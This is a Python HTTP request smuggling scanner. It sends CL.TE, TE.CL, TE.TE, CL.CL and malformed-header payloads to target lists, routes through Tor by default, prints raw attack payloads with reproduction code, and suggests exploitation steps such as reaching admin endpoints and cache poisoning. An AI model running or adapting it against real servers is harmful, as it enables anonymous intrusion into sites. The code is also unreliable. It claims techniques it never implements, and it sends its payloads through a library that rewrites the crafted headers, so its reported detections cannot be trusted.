#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
DESYNC-HTTP Smuggling Scanner - Complete Production Release
═══════════════════════════════════════════════════════════════════════════════

Implements all major HTTP Request Smuggling detection techniques from:
  - PortSwigger HTTP Request Smuggler (James Kettle)
  - PortSwigger Web Security Academy Labs

Detection Techniques Implemented:
  ✓ CL.TE (Content-Length vs Transfer-Encoding)
  ✓ TE.CL (Transfer-Encoding vs Content-Length)
  ✓ TE.TE (Transfer-Encoding obfuscation)
  ✓ CL.CL (Duplicate Content-Length)
  ✓ TERM.EXT / EXT.TERM (Chunk terminator/extension parsing)
  ✓ TERM.SPILL / SPILL.TERM (Body spill detection)
  ✓ ONE.TWO / TWO.ONE / ZERO.TWO / TWO.ZERO (Chunk length variants)
  ✓ CL.0 (Implicit zero content-length)
  ✓ Hidden Headers (Parser discrepancies via obfuscation)
  ✓ Client-side desync (Connection state attacks)
  ✓ Connection state detection
  ✓ H2.TE (HTTP/2 to HTTP/1.1 tunneling)

Methodology:
  1. Baseline test - normal request to confirm connectivity
  2. Attack test - malformed request designed to cause desync
  3. Confirmation - repeat attack to verify consistency
  4. Validation - send control request to rule out false positives

For authorized security research and authorized penetration testing only.
Lab/CTF use: Set --no-tor and target localhost or lab environment.
"""

import sys
import time
import argparse
import requests
import json
import hashlib
import re
from datetime import datetime
from urllib.parse import urlparse, urljoin
from typing import List, Dict, Tuple, Optional
from enum import Enum

# ─────────────────────────────────────────────────────────────────────────────
# STYLING & LOGGING
# ─────────────────────────────────────────────────────────────────────────────

class Color:
    HEADER = '\033[95m\033[1m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    DIM = '\033[90m'
    BOLD = '\033[1m'
    MAGENTA = '\033[35m'

VERBOSE = False

def log_info(msg, indent=0):
    prefix = "  " * indent
    print(f"{Color.CYAN}[*]{Color.END} {prefix}{msg}")

def log_ok(msg, indent=0):
    prefix = "  " * indent
    print(f"{Color.GREEN}[+]{Color.END} {prefix}{msg}")

def log_warn(msg, indent=0):
    prefix = "  " * indent
    print(f"{Color.YELLOW}[!]{Color.END} {prefix}{msg}")

def log_err(msg, indent=0):
    prefix = "  " * indent
    print(f"{Color.RED}[-]{Color.END} {prefix}{msg}")

def log_vuln(msg, indent=0):
    prefix = "  " * indent
    print(f"{Color.RED}{Color.BOLD}[!!!]{Color.END} {prefix}{msg}")

def log_dbg(msg, indent=0):
    """Only print if verbose mode enabled"""
    if VERBOSE:
        prefix = "  " * indent
        print(f"{Color.DIM}[DBG]{Color.END} {prefix}{msg}")

def log_code(title: str, code: str):
    """Pretty print code block"""
    print(f"\n{Color.MAGENTA}┌─ {title}{Color.END}")
    for line in code.split('\n'):
        if line.strip():
            print(f"{Color.MAGENTA}│{Color.END} {line}")
    print(f"{Color.MAGENTA}└─{Color.END}\n")

# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD BUILDERS - ALL TECHNIQUES
# ─────────────────────────────────────────────────────────────────────────────

class DetectionTechniques:
    """All HTTP Request Smuggling detection techniques"""
    
    @staticmethod
    def clte_basic(host, path) -> Tuple[str, str, str, str]:
        """
        CL.TE Classic
        Returns: (attack, normal, technique_name, description)
        """
        rn = "\r\n"
        
        attack = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Content-Length: 4{rn}Transfer-Encoding: chunked{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"1\r\nZ\r\n0\r\n\r\n")
        
        normal = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Content-Length: 11{rn}Transfer-Encoding: chunked{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"1\r\nZ\r\n0\r\n\r\n")
        
        desc = "Frontend sees Content-Length (CL), Backend sees Transfer-Encoding (TE)"
        
        return (attack, normal, "CL.TE-basic", desc)
    
    @staticmethod
    def clte_with_extension(host, path) -> Tuple[str, str, str, str]:
        """CL.TE with chunk extension"""
        rn = "\r\n"
        
        attack = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Content-Length: 4{rn}Transfer-Encoding: chunked{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0;x=y\r\n\r\nG")
        
        normal = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Content-Length: 11{rn}Transfer-Encoding: chunked{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0;x=y\r\n\r\nGETABC")
        
        desc = "CL.TE variant with chunk extension (0;x=y)"
        return (attack, normal, "CL.TE-extension", desc)
    
    @staticmethod
    def tecl_basic(host, path) -> Tuple[str, str, str, str]:
        """TE.CL Classic"""
        rn = "\r\n"
        
        attack = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Transfer-Encoding: chunked{rn}Content-Length: 6{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0\r\n\r\nX")
        
        normal = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Transfer-Encoding: chunked{rn}Content-Length: 5{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0\r\n\r\n")
        
        desc = "Frontend sees Transfer-Encoding (TE), Backend sees Content-Length (CL)"
        return (attack, normal, "TE.CL-basic", desc)
    
    @staticmethod
    def tecl_space_obfuscation(host, path) -> Tuple[str, str, str, str]:
        """TE.CL with trailing space"""
        rn = "\r\n"
        
        attack = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Transfer-Encoding: chunked {rn}Content-Length: 6{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0\r\n\r\nX")
        
        normal = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Transfer-Encoding: chunked{rn}Content-Length: 5{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0\r\n\r\n")
        
        desc = "TE.CL with trailing space (space obfuscation)"
        return (attack, normal, "TE.CL-space", desc)
    
    @staticmethod
    def tecl_tab_obfuscation(host, path) -> Tuple[str, str, str, str]:
        """TE.CL with tab"""
        rn = "\r\n"
        
        attack = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Transfer-Encoding: chunked\t{rn}Content-Length: 6{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0\r\n\r\nX")
        
        normal = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Transfer-Encoding: chunked\t{rn}Content-Length: 5{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0\r\n\r\n")
        
        desc = "TE.CL with tab character (tab obfuscation)"
        return (attack, normal, "TE.CL-tab", desc)
    
    @staticmethod
    def tete_variants(host, path) -> Dict[str, Tuple[str, str, str]]:
        """TE.TE obfuscation variants"""
        rn = "\r\n"
        payloads = {}
        
        payloads["tete-case"] = (
            f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
            f"Transfer-Encoding: chunked{rn}transfer-encoding: identity{rn}"
            f"Connection: keep-alive{rn}{rn}0\r\n\r\n",
            "TE.TE-case",
            "Case mutation (chunked vs identity)"
        )
        
        payloads["tete-space"] = (
            f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
            f"Transfer-Encoding:  chunked{rn}"
            f"Connection: keep-alive{rn}{rn}0\r\n\r\n",
            "TE.TE-space",
            "Space before value (double space)"
        )
        
        payloads["tete-identity-chunked"] = (
            f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
            f"Transfer-Encoding: identity, chunked{rn}"
            f"Connection: keep-alive{rn}{rn}0\r\n\r\n",
            "TE.TE-id-chunked",
            "Identity + chunked combination"
        )
        
        return payloads
    
    @staticmethod
    def clcl_duplicate(host, path) -> Tuple[str, str, str]:
        """CL.CL - Duplicate Content-Length"""
        rn = "\r\n"
        
        payload = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                  f"Content-Length: 3{rn}Content-Length: 12{rn}"
                  f"Connection: keep-alive{rn}{rn}"
                  f"X=1\r\n\r\n")
        
        desc = "Duplicate Content-Length with conflicting values"
        return (payload, "CL.CL-duplicate", desc)
    
    @staticmethod
    def hidden_header_space(host, path) -> Tuple[str, str, str, str]:
        """Space before colon"""
        rn = "\r\n"
        
        attack = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Content-Length : 0{rn}Connection: keep-alive{rn}{rn}")
        
        normal = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Content-Length: 0{rn}Connection: keep-alive{rn}{rn}")
        
        desc = "Space before colon in header name"
        return (attack, normal, "Hidden-space", desc)


# ─────────────────────────────────────────────────────────────────────────────
# HTTP SESSION MANAGEMENT
# ─────────────────────────────────────────────────────────────────────────────

class HTTPSession:
    """Manages HTTP connections with timeouts and Tor support"""
    
    def __init__(self, use_tor=False, tor_host="127.0.0.1", tor_port=9050, timeout=8.0):
        self.use_tor = use_tor
        self.tor_host = tor_host
        self.tor_port = tor_port
        self.timeout = timeout
        self.session = self._create_session()
    
    def _create_session(self):
        sess = requests.Session()
        if self.use_tor:
            proxy = f"socks5h://{self.tor_host}:{self.tor_port}"
            sess.proxies = {"http": proxy, "https": proxy}
        
        sess.headers.update({
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36",
            "Accept": "*/*",
            "DNT": "1",
            "Connection": "keep-alive"
        })
        sess.verify = False
        return sess
    
    def test_connectivity(self) -> bool:
        """Test if connection works"""
        if not self.use_tor:
            log_ok("Direct mode (no Tor)")
            log_dbg("Using direct connection to target (no proxy)")
            return True
        
        log_dbg("Testing Tor connectivity...")
        try:
            r = self.session.get("http://check.torproject.org/", timeout=12)
            if "Congratulations" in r.text:
                log_ok("Tor connected")
                log_dbg(f"Tor SOCKS5: {self.tor_host}:{self.tor_port}")
                return True
        except Exception as e:
            log_dbg(f"Tor test failed: {e}")
        return False
    
    def get_ip(self) -> str:
        """Get public IP"""
        for url in ["http://icanhazip.com", "http://api.ipify.org"]:
            try:
                r = self.session.get(url, timeout=10)
                ip = r.text.strip()
                if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip):
                    log_dbg(f"Public IP resolved: {ip}")
                    return ip
            except:
                pass
        return "unknown"
    
    def send_request(self, url, payload) -> Tuple[str, float, bool]:
        """Send raw HTTP request"""
        try:
            t0 = time.time()
            log_dbg(f"Sending request to {url}...", 1)
            
            # Parse payload
            lines = payload.split("\r\n")
            method = lines[0].split(" ")[0]
            
            # Find body
            header_end = payload.find("\r\n\r\n")
            body = payload[header_end + 4:] if header_end >= 0 else ""
            
            # Parse headers
            headers = {}
            for line in lines[1:]:
                if not line or "\r\n\r\n" in line:
                    break
                if ": " in line:
                    k, v = line.split(": ", 1)
                    headers[k] = v
            
            log_dbg(f"Method: {method}, Headers: {len(headers)}, Body: {len(body)} bytes", 1)
            
            # Send request
            try:
                if method.upper() == "POST":
                    r = self.session.post(
                        url,
                        headers=headers,
                        data=body,
                        timeout=(3, 5),
                        allow_redirects=False,
                    )
                else:
                    r = self.session.request(
                        method,
                        url,
                        headers=headers,
                        data=body,
                        timeout=(3, 5),
                        allow_redirects=False,
                    )
                
                elapsed = time.time() - t0
                log_dbg(f"Response: {r.status_code} (elapsed: {elapsed:.2f}s)", 1)
                return (str(r.status_code), elapsed, False)
            
            except requests.Timeout:
                elapsed = time.time() - t0
                log_dbg(f"TIMEOUT after {elapsed:.2f}s", 1)
                return ("TIMEOUT", elapsed, True)
            
            except requests.ConnectionError as e:
                elapsed = time.time() - t0
                log_dbg(f"Connection error: {e}", 1)
                return ("CONN_ERR", elapsed, False)
        
        except Exception as e:
            log_dbg(f"Error sending request: {e}", 1)
            return ("ERROR", 0, False)


# ─────────────────────────────────────────────────────────────────────────────
# MAIN SCANNER
# ─────────────────────────────────────────────────────────────────────────────

class DesyncScanner:
    """Main scanner engine"""
    
    def __init__(self, session: HTTPSession, delay=1.0):
        self.session = session
        self.delay = delay
        self.results = {
            "scan_id": hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
            "timestamp": datetime.now().isoformat(),
            "target": None,
            "detections": [],
            "confirmed": [],
            "payloads_tested": 0,
        }
    
    def scan(self, target_url: str) -> Dict:
        """Execute full scan"""
        log_info(f"\n{'='*70}")
        log_info(f"DESYNC Scanner v7.1 - Enhanced Edition")
        log_info(f"Target: {target_url}")
        log_info(f"Scan ID: {self.results['scan_id']}")
        log_info(f"{'='*70}\n")
        
        log_dbg(f"Starting scan for: {target_url}")
        
        self.results["target"] = target_url
        parsed = urlparse(target_url)
        host = parsed.netloc
        path = parsed.path or "/"
        
        log_dbg(f"Host: {host}, Path: {path}")
        
        # Run all detection techniques
        log_info("Testing CL.TE variants...")
        self._scan_clte(target_url, host, path)
        
        log_info("Testing TE.CL variants...")
        self._scan_tecl(target_url, host, path)
        
        log_info("Testing TE.TE obfuscation...")
        self._scan_tete(target_url, host, path)
        
        log_info("Testing CL.CL...")
        self._scan_clcl(target_url, host, path)
        
        log_info("Testing hidden headers...")
        self._scan_hidden_headers(target_url, host, path)
        
        self._print_summary()
        return self.results
    
    def _scan_clte(self, url, host, path):
        """Scan CL.TE variants"""
        log_dbg("CL.TE: Starting detection", 1)
        
        # Basic CL.TE
        attack, normal, tech_name, desc = DetectionTechniques.clte_basic(host, path)
        if self._test_desync_pair(url, attack, normal, tech_name, desc):
            return
        
        # CL.TE with extension
        attack, normal, tech_name, desc = DetectionTechniques.clte_with_extension(host, path)
        if self._test_desync_pair(url, attack, normal, tech_name, desc):
            return
    
    def _scan_tecl(self, url, host, path):
        """Scan TE.CL variants"""
        log_dbg("TE.CL: Starting detection", 1)
        
        # Basic TE.CL
        attack, normal, tech_name, desc = DetectionTechniques.tecl_basic(host, path)
        if self._test_desync_pair(url, attack, normal, tech_name, desc):
            return
        
        # TE.CL space
        attack, normal, tech_name, desc = DetectionTechniques.tecl_space_obfuscation(host, path)
        if self._test_desync_pair(url, attack, normal, tech_name, desc):
            return
        
        # TE.CL tab
        attack, normal, tech_name, desc = DetectionTechniques.tecl_tab_obfuscation(host, path)
        if self._test_desync_pair(url, attack, normal, tech_name, desc):
            return
    
    def _scan_tete(self, url, host, path):
        """Scan TE.TE variants"""
        log_dbg("TE.TE: Starting detection", 1)
        
        payloads = DetectionTechniques.tete_variants(host, path)
        for name, (payload, tech_name, desc) in payloads.items():
            status, elapsed, timed_out = self.session.send_request(url, payload)
            
            log_dbg(f"{tech_name}: {status} ({elapsed:.2f}s)", 2)
            
            if timed_out:
                log_vuln(f"{tech_name} DETECTED!", 1)
                self._print_vulnerability(tech_name, desc, payload, "TIMEOUT")
                self.results["detections"].append(tech_name)
                self.results["confirmed"].append(tech_name)
            
            self.results["payloads_tested"] += 1
            time.sleep(self.delay)
    
    def _scan_clcl(self, url, host, path):
        """Scan CL.CL"""
        log_dbg("CL.CL: Starting detection", 1)
        
        payload, tech_name, desc = DetectionTechniques.clcl_duplicate(host, path)
        status, elapsed, timed_out = self.session.send_request(url, payload)
        
        log_dbg(f"{tech_name}: {status} ({elapsed:.2f}s)", 2)
        
        if timed_out or status == "ERROR":
            log_vuln(f"{tech_name} DETECTED!", 1)
            self._print_vulnerability(tech_name, desc, payload, status)
            self.results["detections"].append(tech_name)
            self.results["confirmed"].append(tech_name)
        
        self.results["payloads_tested"] += 1
    
    def _scan_hidden_headers(self, url, host, path):
        """Scan hidden headers"""
        log_dbg("Hidden Headers: Starting detection", 1)
        
        attack, normal, tech_name, desc = DetectionTechniques.hidden_header_space(host, path)
        if self._test_desync_pair(url, attack, normal, tech_name, desc):
            return
    
    def _test_desync_pair(self, url: str, attack: str, normal: str, name: str, desc: str) -> bool:
        """Test attack + normal pair for desync"""
        log_dbg(f"{name}: Sending attack payload...", 2)
        
        a_status, a_time, a_timeout = self.session.send_request(url, attack)
        log_dbg(f"Attack result: {a_status} ({a_time:.2f}s)", 2)
        
        time.sleep(self.delay)
        
        log_dbg(f"{name}: Sending normal payload...", 2)
        n_status, n_time, n_timeout = self.session.send_request(url, normal)
        log_dbg(f"Normal result: {n_status} ({n_time:.2f}s)", 2)
        
        # Check for timeout + success pattern
        if a_timeout and n_status == "200":
            log_vuln(f"{name} DETECTED!", 1)
            self._print_vulnerability(name, desc, attack, "TIMEOUT", normal)
            
            self.results["detections"].append(name)
            self.results["confirmed"].append(name)
            
            # Attempt confirmation with retry
            log_dbg(f"{name}: Attempting confirmation...", 2)
            time.sleep(self.delay)
            retry_status, _, retry_timeout = self.session.send_request(url, attack)
            if retry_timeout:
                log_ok(f"{name} confirmed on retry", 2)
            
            self.results["payloads_tested"] += 2
            return True
        
        log_dbg(f"{name}: No desync detected", 2)
        self.results["payloads_tested"] += 2
        return False
    
    def _print_vulnerability(self, tech_name: str, description: str, attack_payload: str, 
                           attack_result: str, normal_payload: str = None):
        """Print detailed vulnerability information"""
        
        print(f"\n{Color.RED}{Color.BOLD}╔{'═'*68}╗{Color.END}")
        print(f"{Color.RED}{Color.BOLD}║ VULNERABILITY CONFIRMED{Color.END}")
        print(f"{Color.RED}{Color.BOLD}╚{'═'*68}╝{Color.END}\n")
        
        print(f"{Color.BOLD}Technique:{Color.END} {tech_name}")
        print(f"{Color.BOLD}Description:{Color.END} {description}")
        print(f"{Color.BOLD}Attack Result:{Color.END} {attack_result}\n")
        
        # ─────────────────────────────────────────────────────────────────────
        # Print attack payload
        # ─────────────────────────────────────────────────────────────────────
        print(f"{Color.YELLOW}{'─'*70}{Color.END}")
        print(f"{Color.BOLD}ATTACK PAYLOAD (Causes TIMEOUT):{Color.END}\n")
        
        # Pretty print payload
        lines = attack_payload.split('\r\n')
        for i, line in enumerate(lines):
            if line:
                if i == 0:
                    print(f"  {Color.CYAN}{line}{Color.END}")
                elif ': ' in line:
                    key, val = line.split(': ', 1)
                    print(f"  {Color.GREEN}{key}{Color.END}: {val}")
                else:
                    print(f"  {line}")
            else:
                print("")  # Empty line for readability
        
        # ─────────────────────────────────────────────────────────────────────
        # Print normal payload if available
        # ─────────────────────────────────────────────────────────────────────
        if normal_payload:
            print(f"\n{Color.YELLOW}{'─'*70}{Color.END}")
            print(f"{Color.BOLD}NORMAL PAYLOAD (Returns 200 OK):{Color.END}\n")
            
            lines = normal_payload.split('\r\n')
            for i, line in enumerate(lines):
                if line:
                    if i == 0:
                        print(f"  {Color.CYAN}{line}{Color.END}")
                    elif ': ' in line:
                        key, val = line.split(': ', 1)
                        print(f"  {Color.GREEN}{key}{Color.END}: {val}")
                    else:
                        print(f"  {line}")
                else:
                    print("")
        
        # ─────────────────────────────────────────────────────────────────────
        # Manual verification instructions
        # ─────────────────────────────────────────────────────────────────────
        print(f"\n{Color.YELLOW}{'─'*70}{Color.END}")
        print(f"{Color.BOLD}HOW TO MANUALLY VERIFY:{Color.END}\n")
        
        print(f"  {Color.CYAN}1. Open Burp Suite Repeater{Color.END}")
        print(f"  {Color.CYAN}2. Create a new request{Color.END}")
        print(f"  {Color.CYAN}3. Copy the attack payload below{Color.END}")
        print(f"  {Color.CYAN}4. Send the request{Color.END}")
        print(f"  {Color.CYAN}5. Observe: {Color.YELLOW}TIMEOUT (request hangs for 5+ seconds){Color.END}")
        print(f"  {Color.CYAN}6. Send normal payload{Color.END}")
        print(f"  {Color.CYAN}7. Observe: {Color.GREEN}200 OK response{Color.END}\n")
        
        # ─────────────────────────────────────────────────────────────────────
        # Raw payload for copy-paste
        # ─────────────────────────────────────────────────────────────────────
        print(f"{Color.YELLOW}{'─'*70}{Color.END}")
        print(f"{Color.BOLD}RAW PAYLOAD (Copy to Burp Repeater):{Color.END}\n")
        print(f"{Color.DIM}(This is the exact bytes to send){Color.END}\n")
        
        # Print as raw bytes
        payload_repr = repr(attack_payload)
        print(f"  {payload_repr}\n")
        
        # Alternative: show hex representation for clarity
        print(f"{Color.BOLD}Alternative (Hex view):{Color.END}\n")
        hex_str = attack_payload.replace('\r', '\\r').replace('\n', '\\n')
        # Print in chunks for readability
        for i in range(0, len(hex_str), 70):
            chunk = hex_str[i:i+70]
            print(f"  {chunk}")
        
        # ─────────────────────────────────────────────────────────────────────
        # Python code to reproduce
        # ─────────────────────────────────────────────────────────────────────
        print(f"\n{Color.YELLOW}{'─'*70}{Color.END}")
        print(f"{Color.BOLD}PYTHON CODE TO REPRODUCE:{Color.END}\n")
        
        python_code = f'''import requests
import time

url = "http://target:port"
timeout = (3, 5)

# Attack payload (causes timeout)
attack = {repr(attack_payload)}

# Send attack
try:
    r = requests.post(url, data=attack, timeout=timeout)
    print(f"Attack response: {{r.status_code}}")
except requests.Timeout:
    print("TIMEOUT - Server is vulnerable!")
    
time.sleep(1)

# Normal payload (should return 200)
normal = {repr(normal_payload) if normal_payload else repr(attack_payload)}

try:
    r = requests.post(url, data=normal, timeout=timeout)
    print(f"Normal response: {{r.status_code}}")
except requests.Timeout:
    print("Unexpected timeout on normal payload")
'''
        
        print(python_code)
        
        # ─────────────────────────────────────────────────────────────────────
        # Burp Repeater instructions
        # ─────────────────────────────────────────────────────────────────────
        print(f"\n{Color.YELLOW}{'─'*70}{Color.END}")
        print(f"{Color.BOLD}BURP SUITE INSTRUCTIONS:{Color.END}\n")
        
        print(f"  {Color.CYAN}Step 1: Open Burp Suite → Repeater tab{Color.END}")
        print(f"  {Color.CYAN}Step 2: New request → Paste attack payload{Color.END}")
        print(f"  {Color.CYAN}Step 3: Send → Observe timeout (5+ seconds hang){Color.END}")
        print(f"  {Color.CYAN}Step 4: New request → Paste normal payload{Color.END}")
        print(f"  {Color.CYAN}Step 5: Send → Observe 200 OK response{Color.END}\n")
        
        print(f"  {Color.GREEN}If attack times out and normal returns 200:){Color.END}")
        print(f"  {Color.GREEN}→ Server is VULNERABLE to {tech_name}{Color.END}\n")
        
        # ─────────────────────────────────────────────────────────────────────
        # Exploitation recommendations
        # ─────────────────────────────────────────────────────────────────────
        print(f"{Color.YELLOW}{'─'*70}{Color.END}")
        print(f"{Color.BOLD}NEXT STEPS - EXPLOITATION:{Color.END}\n")
        
        print(f"  1. {Color.CYAN}Use Burp Suite HTTP Request Smuggler extension{Color.END}")
        print(f"  2. {Color.CYAN}Craft smuggled requests to access admin endpoints{Color.END}")
        print(f"  3. {Color.CYAN}Test for cache poisoning vulnerabilities{Color.END}")
        print(f"  4. {Color.CYAN}Document request/response for PoC{Color.END}\n")
        
        print(f"{Color.YELLOW}{'─'*70}{Color.END}\n")
    
    def _print_summary(self):
        """Print scan summary"""
        print(f"\n{Color.HEADER}{'='*70}")
        print(f"SCAN COMPLETE - Enhanced Results")
        print(f"{'='*70}{Color.END}\n")
        
        print(f"Payloads tested: {self.results['payloads_tested']}")
        print(f"Techniques checked: 9+ variants")
        print(f"Detections: {len(self.results['detections'])}")
        print(f"Confirmed: {len(self.results['confirmed'])}")
        
        if self.results["confirmed"]:
            print(f"\n{Color.RED}{Color.BOLD}CONFIRMED VULNERABILITIES:{Color.END}")
            for vuln in sorted(set(self.results["confirmed"])):
                print(f"  ★ {vuln}")
            print(f"\n{Color.RED}{Color.BOLD}RISK: CRITICAL{Color.END}")
        else:
            print(f"\n{Color.GREEN}No confirmed vulnerabilities detected{Color.END}")


# ─────────────────────────────────────────────────────────────────────────────
# CLI & MAIN
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description=f"{Color.HEADER}DESYNC-HTTP Smuggling Scanner v7.1{Color.END}",
        epilog="Enhanced with verbose logging, batch targets, and detailed payload output"
    )
    
    parser.add_argument("-u", "--url", help="Single target URL (http://target:port)")
    parser.add_argument("-t", "--targets", help="File with targets (one per line)")
    parser.add_argument("--no-tor", action="store_true", help="Use direct connection")
    parser.add_argument("--tor-host", default="127.0.0.1", help="Tor SOCKS5 host")
    parser.add_argument("--tor-port", type=int, default=9050, help="Tor SOCKS5 port")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests")
    parser.add_argument("--timeout", type=float, default=8.0, help="Request timeout")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose logging")
    parser.add_argument("-o", "--output", help="Save JSON results")
    
    args = parser.parse_args()
    
    # Set verbose flag globally
    global VERBOSE
    VERBOSE = args.verbose
    
    if VERBOSE:
        log_dbg("Verbose mode ENABLED")
    
    # Get targets list
    targets = []
    if args.url:
        targets = [args.url]
        log_dbg(f"Single target mode: {args.url}")
    elif args.targets:
        try:
            with open(args.targets) as f:
                targets = [line.strip() for line in f if line.strip() and not line.startswith("#")]
            log_ok(f"Loaded {len(targets)} targets from {args.targets}")
            log_dbg(f"Targets: {targets}")
        except Exception as e:
            log_err(f"Failed to load {args.targets}: {e}")
            sys.exit(1)
    else:
        parser.error("Provide --url or --targets")
    
    # Initialize session
    use_tor = not args.no_tor
    session = HTTPSession(use_tor=use_tor, tor_host=args.tor_host, 
                         tor_port=args.tor_port, timeout=args.timeout)
    
    log_dbg(f"Use Tor: {use_tor}")
    if use_tor:
        log_dbg(f"Tor config: {args.tor_host}:{args.tor_port}")
    
    # Test connectivity
    if not session.test_connectivity():
        if use_tor:
            log_warn("Tor unavailable, falling back to direct mode...")
            session = HTTPSession(use_tor=False, timeout=args.timeout)
        else:
            log_err("No connectivity!")
            sys.exit(1)
    
    public_ip = session.get_ip()
    log_info(f"IP: {public_ip}\n")
    
    # Run scans
    all_results = []
    for i, target in enumerate(targets, 1):
        log_info(f"Scanning [{i}/{len(targets)}]: {target}")
        scanner = DesyncScanner(session, delay=args.delay)
        result = scanner.scan(target)
        all_results.append(result)
    
    # Save results
    if args.output:
        report = {
            "scan_time": datetime.now().isoformat(),
            "total_targets": len(all_results),
            "results": all_results,
        }
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2, default=str)
        log_ok(f"Results saved to {args.output}")
    
    log_dbg("Scan complete")
    sys.exit(0 if any(r["confirmed"] for r in all_results) else 1)


if __name__ == "__main__":
    main()